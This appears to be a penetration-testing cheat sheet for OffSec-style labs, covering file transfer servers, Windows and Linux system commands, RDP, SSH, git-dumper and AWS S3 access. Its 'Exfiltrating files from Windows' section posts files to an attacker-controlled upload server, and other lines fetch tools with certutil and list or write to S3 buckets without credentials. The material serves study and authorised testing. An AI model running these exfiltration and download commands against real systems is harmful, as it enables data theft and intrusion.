# 🦩 General

<div align="center">
    <img src=assets/main.png>
</div>

## File Transfers

!!! tip
    Beware of reflected ports!

### HTTP Server

```shell
# simple python server
python -m http.server <port>
# simple python upload-enabled server (optional basic auth)
pip install uploadserver
python -m uploadserver --basic-auth user:pass <port>

# WebDAV server
wsgidav -H 0.0.0.0 -p 80 --auth anonymous -r .

# Apache (copy files to /var/www/html)
sudo systemctl start apache2
```

### SMB Server

```shell
impacket-smbserver -smb2support share $(pwd) 
# win 10+ Compatibility (With Authentication)
impacket-smbserver -smb2support -user test -password test share $(pwd) 
```

### Netcat

```shell
# start a listener (nc|nc.exe)
nc -lvnp <port> > received_file

# send the file
nc <ip> <port> < <file_path>
```

### Downloading files on Windows

```shell
# PowerShell
iwr -uri <uri> -outfile <filename>

# cmd
certutil -urlcache -split -f <uri> <dest>

# copy from smb share
copy \\<ip>\share\<file>

# mount share before copy. (win 10+ w/o Authentication)
net use Z: \\<ip>\share
# mount share before copy. (win 10+ w/ Authentication)
net use Z: \\<ip>\share /u:user 'pass'
```

### Exfiltrating files from Windows

```shell
# send file to python upload-enabled server
Invoke-WebRequest -Uri http://<linux-ip>:<port>/upload -Method Post -InFile C:\path\to\file
curl -F "file=@C:\path\to\file.txt" http://<linux-ip>:<port> -u user:pass

# copy to smb share
copy C:\path\to\file \\<ip>\share

# mount share before copy. (win 10+ w/o Authentication)
net use Z: \\<ip>\share
# mount share before copy. (win 10+ w/ Authentication)
net use Z: \\<ip>\share /u:user 'pass'
```

### Downloading files on Linux

```shell
# wget and curl
wget http://<ip>:<port>/<file>
curl -O http://<ip>:<port>/<file>
```

## Connecting to RDP

```shell
# add resolution support
xfreerdp3 /u:user /p:pass /v:<ip> /dynamic-resolution
# add clipboard support
xfreerdp3 /u:user /p:pass /v:<ip> +clipboard
# add a share to easily transfer files
xfreerdp3 /u:user /p:pass /v:<ip> /drive:<name>,<path>
```

## SSH

```shell
# create keys
ssh-keygen -t rsa -b 4096

# transfer data to
scp <file> <user>@<ip>:<path>
# transfer data from
scp <user>@<ip>:<path> <file>
# use legacy SCP protocol instead of SFTP
scp -O <file> <user>@<ip>:<path>
```

## Misc

```shell
# reduce binary size (useful for binaries that are going to be transferred)
upx <bin_path>

# find printable strings in a file
strings

# display dynamic library calls of a process
ltrace
```

## OS Commands

### System Information

**Linux:**

```shell
# kernel info
uname -a
# distro info
lsb_release -a
```

**Windows:**

```shell
# system info
systeminfo
Get-ComputerInfo
# os details
wmic os get version
Get-WmiObject Win32_OperatingSystem
# show drives
Get-PSDrive
# show tasks
schtasks
Get-ScheduledTask
# recent system events
Get-EventLog -LogName System -Newest 10
# path permissions
icacls "<path>"
Get-ACL "<path>"
```

### User Management

**Linux:**

```shell
# show user info
id <username>
whoami
groups <username>
# switch to user
su - <username>
sudo su - <username>
# switch to root
su -
sudo su -
# check user sudo permissions
sudo -l

# create/delete/change pass users
useradd -m username
useradd -u <UID> -g <group> <uname>
userdel -r username
passwd username
# add to group
usermod -aG sudo username

# show who is currently logged in
who|w
# show last logins
last
```

**Windows:**

```shell
# show current user
whoami /all
# list all users
net user
Get-LocalUser
# show user details
net user username
# create/delete/change pass user
net user username password /add
New-LocalUser -Name "username" -Password (ConvertTo-SecureString "password" -AsPlainText -Force)
net user username /delete
net user username newpassword
# list all groups
net localgroup
Get-LocalGroup
# show members
net localgroup groupname
Get-LocalGroupMember "Administrators"
# add/delete user to group
net localgroup groupname username /add
Add-LocalGroupMember -Group "Administrators" -Member "username"
net localgroup groupname username /delete
net localgroup Administrators username /add

# run command as a different user
runas /user:domain\username cmd
```

### File Operations

**Linux:**

```shell
find / -name filename 2>/dev/null
# find text in files
grep -r "text" /path 2>/dev/null

# compress/extract files
tar -czvf archive.tar.gz /path
tar -xzvf archive.tar.gz
```

**Windows:**

```shell
dir /s filename 2>nul
Get-ChildItem -Recurse -Filter *.txt -ErrorAction SilentlyContinue
# find text in files
findstr /s "text" * 2>nul
Select-String -Path *.txt -Pattern "text" -ErrorAction SilentlyContinue

# copy dirs recursively
xcopy /s /e source destination /Y 2>nul
Copy-Item -Recurse source destination -Force
# move
move source destination
# delete
del filename /Q
Remove-Item -Recurse -Force path
```

### Process Management

**Linux:**

```shell
ps aux
ps auxww
kill <pid>
# force
kill -9 <pid>
killall <process_name>
# find process pid by name
pgrep process_name
```

**Windows:**

```shell
tasklist
wmic process list full
# find specific
tasklist | findstr <program.exe>

# force kill process by name
taskkill /F /IM <program.exe>
# by id
taskkill /PID <pid_number> /F

Get-Process
# force kill process by id
Stop-Process -Id PID -Force
Stop-Process -Name "process" -Force
```

### Networking

**Linux:**

```shell
# show interfaces
ip a
ifconfig
# list listening connections
ss -ntplu
netstat -ntplu
# test connectivity
ping host
# trace path
traceroute host
# DNS lookup
dig domain
nslookup domain
# kill connection
fuser -k <port>/tcp
fuser -k <port>/udp
# routing table
ip route show
# log incoming traffic on a specific port
sudo tcpdump -nvvvXi tun0 tcp port 8080
```

**Windows:**

```shell
# show network config
ipconfig /all
# connections and listening ports
netstat -ano
# show ip addresses
Get-NetIPAddress
# show tcp connections
Get-NetTCPConnection
# dns lookup
nslookup domain
Resolve-DnsName domain
# trace path
tracert host
# test connectivity
Test-NetConnection host -Port port
# routing table
route print
```

### Service Management

**Linux:**

```shell
# systemd distros
systemctl status service_name
systemctl start|stop|restart service_name
# enable service to start at boot
systemctl enable|disable service_name

# no systemd
service service_name status
service service_name start|stop|restart

# other
ls /etc/init.d/
/etc/init.d/service_name start|stop|restart
```

**Windows:**

```shell
sc query service_name
Get-Service service_name

sc start|stop service_name
net start|stop service_name
Start-Service service_name
Stop-Service service_name
Restart-Service service_name

# set service to start auto
sc config service_name start=auto
Set-Service service_name -StartupType Automatic
Set-Service service_name -StartupType Disabled
# disable service
sc config service_name start=disabled

# list all running services
Get-Service | Where-Object {$_.Status -eq "Running"}
```

### System Control

**Linux:**

```shell
sudo reboot
sudo shutdown -r now
# shutdown
sudo shutdown -h now
# traditional restart
sudo init 6
```

**Windows:**

```shell
# restart and shutdown
shutdown /r /t 0
shutdown /s /t 0

Restart-Computer -Force
Stop-Computer
```

### Error Suppression

**Windows:**

- **CMD**: Append `2>nul` to suppress error messages
- **PowerShell**: Add `-ErrorAction SilentlyContinue` parameter to cmdlets

**Linux:**

- Append `2>/dev/null` to suppress error messages only
- Append `&>/dev/null` to suppress both standard output and errors

## Git

> [git-dumper](https://github.com/arthaud/git-dumper)

```shell
# dump git repo from url
git-dumper <url>/.git ./website

# show commits on a branch
git log
# show commit details and changes
git show <commit>
```

## AWS

!!! warning ""
    Out of Scope

Setup credentials if you find access keys

```shell
aws configure
```

### S3

```shell
# list public buckets without credentials
aws s3 ls s3://<bucket>/ --endpoint-url <url> --no-sign-request

# download a bucket
aws s3 cp s3://<bucket> ./

# check bucket policy
aws s3api get-bucket-policy --bucket <bucket> --endpoint-url <url> --no-sign-request

# upload a file to a bucket
aws s3 cp <file> s3://<bucket>/ --endpoint-url <url> --no-sign-request
```

## VPN

!!! danger
    Offsec machines and VPN are sometimes unstable.

Reduce MTU if reverse shells are not connecting back.

```shell
ifconfig tun0 mtu 1200
```
